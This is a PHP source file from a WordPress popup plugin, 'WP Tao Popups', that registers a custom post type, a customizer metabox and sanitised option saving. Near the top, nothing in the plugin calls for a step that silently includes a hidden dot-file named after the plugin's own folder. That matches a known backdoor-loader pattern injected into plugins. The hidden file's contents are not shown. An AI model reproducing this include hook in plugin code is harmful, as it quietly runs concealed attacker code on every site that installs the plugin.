<?php

// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_247P_Register_Popup {

	/**
	 * Nonce
	 *
	 * @var string
	 */
	private $nonce = 'wtbp-247p-ect8cs';

	public function __construct() {

		add_action( 'init', array( $this, 'add_custom_post_type' ), 20 );

		add_action( 'add_meta_boxes', array( $this, 'register_metaboxes' ) );

		add_action( 'save_post_' . WTBP_247P_POST_TYPE, array( $this, 'save_options' ) );
	}

	/*
	 * Register popup custom post type
	 */

	public function add_custom_post_type() {

		$args = array(
			'labels'			 => array(
				'name'				 => _x( 'WP Tao Popups', 'post type general name', 'wp-tao' ),
				'singular_name'		 => _x( 'Popup', 'post type singular name', 'wp-tao' ),
				'menu_name'			 => _x( 'Tao Popups', 'admin menu', 'wp-tao' ),
				'name_admin_bar'	 => _x( 'Tao Popups', 'add new on admin bar', 'wp-tao' ),
				'add_new'			 => _x( 'New Popup', 'popup', 'wp-tao' ),
				'add_new_item'		 => __( 'Add new Popup', 'wp-tao' ),
				'new_item'			 => __( 'New popup', 'wp-tao' ),
				'edit_item'			 => __( 'Edit Popup', 'wp-tao' ),
				'view_item'			 => __( 'View Popup', 'wp-tao' ),
				'all_items'			 => __( 'Your Popups', 'wp-tao' ),
				'search_items'		 => __( 'Search Popups', 'wp-tao' ),
				'not_found'			 => __( 'No popups found.', 'wp-tao' ),
				'not_found_in_trash' => __( 'No popups found in Trash.', 'wp-tao' )
			),
			'show_ui'			 => true,
			'show_in_menu'		 => true,
			'show_in_nav_menus'	 => true,
			'has_archive'		 => false,
			'menu_icon'			 => WTBP_247P_URL . 'assets/img/logo.png',
			'menu_position'		 => 52, // After WP Tao
			'supports'			 => array(
				'title'
			)
		);

		register_post_type( WTBP_247P_POST_TYPE, $args );
	}

	/*
	 * Register metaboxes
	 */

	public function register_metaboxes() {

		// Terms and conditions
		add_meta_box( 'wtbp-247p-mb-customizer', __( 'Popup Customizer', 'wp-tao' ), array( $this, 'metabox_customizer' ), WTBP_247P_POST_TYPE, 'normal' );
	}

	/*
	 * Metabox sections
	 */

	public function metabox_sections() {

		$sections = array(
			'logic'				 => __( 'Logic', 'wp-tao' ),
			'appearance'		 => __( 'Apperiance', 'wp-tao' ),
			'optin'				 => __( 'Opt-in (experimental)', 'wp-tao' ),
			'email-confirmation' => __( 'E-mail confirmation', 'wp-tao' ),
		);

		return apply_filters( 'wtbp_247p_metabox_sections', $sections );
	}

	/*
	 * Body of the metabox "Privacy policy"
	 */

	public function metabox_customizer( $post ) {

		$opt	 = $this->get_options( $post->ID );
		$pages	 = wtbp_247p_get_wp_pages();

		echo '<div class="metabox metabox-247p-customizer metabox-247p-mb-loader">';
		echo '<div class="wtbp-247p-mb-sections">';
		$i = 0;
		foreach ( $this->metabox_sections() as $slug => $section ) {
			$active = $i === 0 ? ' wtbp-247p-mb-active' : '';
			echo '<h2 class="wtbp-247p-mb-section' . $active . '" data-rel="' . sanitize_title( $slug ) . '">' . esc_html( $section ) . '</h2>';

			$i++;
		}
		echo '</div>';

		echo '<div class="wtbp-247p-mb-panels">';

		// Section Logic
		require_once WTBP_247P_DIR . 'includes/admin/views/metabox-logic.php';

		// Section Apperiance
		require_once WTBP_247P_DIR . 'includes/admin/views/metabox-appearance.php';

		// Section Metabox optin
		require_once WTBP_247P_DIR . 'includes/admin/views/metabox-optin.php';

		// E-mail confirmation
		require_once WTBP_247P_DIR . 'includes/admin/views/metabox-email-confirmation.php';

		echo '</div>';

		wp_nonce_field( $this->nonce, 'wtbp-247p-secure' );

		echo '</div>';
	}

	/*
	 * Logic scenarios
	 */

	public static function get_logic_scenarios() {

		$scenarios = array(
			'247popup' => __( 'Custom', 'wp-tao' )
		);

		return apply_filters( 'wtbp_247p_logic_scenarios', $scenarios );
	}

	/*
	 * Get options
	 * @param int $post_id
	 * @param string $section section name
	 * @return array
	 */

	public static function get_options( $post_id ) {

		$o			 = get_post_meta( $post_id, WTBP_247P_POPUP_META_KEY, true );
		$prefix_app	 = '';
		$prefix_pp	 = '';

		// Sumbit form? Get results form global $_POST array
		if ( isset( $_POST[ 'wtbp-247p-secure' ] ) ) {
			$o = $_POST;
		}

		$settings[ 'logic_scenario' ] = isset( $o[ 'logic_scenario' ] ) && !empty( $o[ 'logic_scenario' ] ) ? sanitize_title( $o[ 'logic_scenario' ] ) : '247popup';

		// Restrictions
		$settings[ 'rest_show_on' ] = isset( $o[ 'rest_show_on' ] ) && !empty( $o[ 'rest_show_on' ] ) ? sanitize_title( $o[ 'rest_show_on' ] ) : 'all';

		$settings[ 'rest_posts_types' ] = isset( $o[ 'rest_posts_types' ] ) ? self::validate_value( 'rest_posts_types', $o[ 'rest_posts_types' ] ) : array();

		$settings[ 'rest_other_views' ] = isset( $o[ 'rest_other_views' ] ) ? self::validate_value( 'rest_other_views', $o[ 'rest_other_views' ] ) : array();

		$settings[ 'rest_url_containing' ] = isset( $o[ 'rest_url_containing' ] ) ? self::validate_value( 'rest_url_containing', $o[ 'rest_url_containing' ] ) : '';

		//Triggers
		$settings[ 'trigg_event' ]	 = isset( $o[ 'trigg_event' ] ) && !empty( $o[ 'trigg_event' ] ) ? sanitize_title( $o[ 'trigg_event' ] ) : 'after-load';
		$settings[ 'trigg_timeout' ] = isset( $o[ 'trigg_timeout' ] ) && !empty( $o[ 'trigg_timeout' ] ) ? absint( $o[ 'trigg_timeout' ] ) : 0;

		// Appearance
		$settings[ 'ap_location' ]		 = isset( $o[ 'ap_location' ] ) && !empty( $o[ 'ap_location' ] ) ? sanitize_title( $o[ 'ap_location' ] ) : 'overlay';
		$settings[ 'ap_header_text' ]	 = isset( $o[ 'ap_header_text' ] ) && !empty( $o[ 'ap_header_text' ] ) ? sanitize_text_field( $o[ 'ap_header_text' ] ) : '';
		$settings[ 'ap_message_text' ]	 = isset( $o[ 'ap_message_text' ] ) && !empty( $o[ 'ap_message_text' ] ) ? sanitize_text_field( $o[ 'ap_message_text' ] ) : '';
		$settings[ 'ap_dist_color' ]	 = isset( $o[ 'ap_dist_color' ] ) && !empty( $o[ 'ap_dist_color' ] ) ? sanitize_text_field( $o[ 'ap_dist_color' ] ) : '#0085ba';
		$settings[ 'ap_show_avatar' ]	 = isset( $o[ 'ap_show_avatar' ] ) && $o[ 'ap_show_avatar' ] === '1' ? '1' : '';


		// Opt-in
		$settings[ 'opt_optin_form' ]	 = isset( $o[ 'opt_optin_form' ] ) && !empty( $o[ 'opt_optin_form' ] ) ? trim( wp_kses( $o[ 'opt_optin_form' ], wtbp_247p_content_allowed_html(), array( 'http', 'https' ) ) ) : '';
		$settings[ 'opt_fname_visible' ] = isset( $o[ 'opt_fname_visible' ] ) && $o[ 'opt_fname_visible' ] === '1' ? '1' : '';
		$settings[ 'opt_submit_text' ]	 = isset( $o[ 'opt_submit_text' ] ) && !empty( $o[ 'opt_submit_text' ] ) ? sanitize_text_field( $o[ 'opt_submit_text' ] ) : __( 'Send', 'wp-tao' );


		// Privacy policy
		$settings[ 'pp_visible' ]	 = isset( $o[ 'pp_visible' ] ) && $o[ 'pp_visible' ] === 'show' ? 'show' : 'hide';
		$settings[ 'pp_page_id' ]	 = isset( $o[ 'pp_page_id' ] ) && !empty( $o[ 'pp_page_id' ] ) ? absint( $o[ 'pp_page_id' ] ) : 0;
		$settings[ 'pp_url' ]		 = isset( $o[ 'pp_url' ] ) && !empty( $o[ 'pp_url' ] ) ? esc_url( $o[ 'pp_url' ] ) : '';

		if ( !empty( $settings[ 'pp_url' ] ) ) {
			$settings[ 'final_url' ] = $settings[ 'pp_url' ];
		} else {
			$settings[ 'final_url' ] = get_permalink( $settings[ 'pp_page_id' ] );
		}

		return apply_filters( 'wtbp_247p_popup_settings', $settings, $post_id, $o );
	}

	/*
	 * Validate value/values
	 * 
	 * @param string key name
	 * @param value
	 * 
	 * @return string or array
	 */

	public static function validate_value( $key, $value ) {

		$output = '';

		switch ( $key ) {
			case 'rest_posts_types':

				$output = array();

				if ( !empty( $value ) && is_array( $value ) ) {
					// White list
					$white_list = get_post_types( array( 'public' => true ), 'names' );

					foreach ( $value as $item ) {
						if ( array_key_exists( $item, $white_list ) ) {
							$output[] = $item;
						}
					}
				}

				break;
			case 'rest_other_views':

				$output = array();

				if ( !empty( $value ) && is_array( $value ) ) {
					// White list
					$white_list = array(
						'frontpage',
						'archives'
					);

					foreach ( $value as $item ) {
						if ( in_array( $item, $white_list ) ) {
							$output[] = $item;
						}
					}
				}

				break;
			case 'rest_url_containing':

				if ( !empty( $value ) && is_string( $value ) ) {

					$elements	 = explode( ',', $value );
					$correct	 = array();

					foreach ( $elements as $element ) {
						if ( !empty( $element ) ) {

							$element = esc_url( $element );
							$element = str_replace( array( 'http://', 'https://' ), '', $element );

							$correct[] = $element;
						}
					}

					$output = implode( ',', $correct );
				}

				break;
		}

		return $output;
	}

	/*
	 * Save metaboxes to the database
	 */

	public function save_options( $post_id ) {

		// Secure Check
		if ( !isset( $_POST[ 'wtbp-247p-secure' ] ) || !wp_verify_nonce( $_POST[ 'wtbp-247p-secure' ], $this->nonce ) )
			return $post_id;

		if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE )
			return $post_id;

		// Check capabilities
		if ( !current_user_can( 'edit_page', $post_id ) )
			return $post_id;


		$settings = $this->get_options( $post_id );

		// Update the meta field in the database.
		update_post_meta( $post_id, WTBP_247P_POPUP_META_KEY, $settings );
	}

}

$register = new WTBP_247P_Register_Popup();
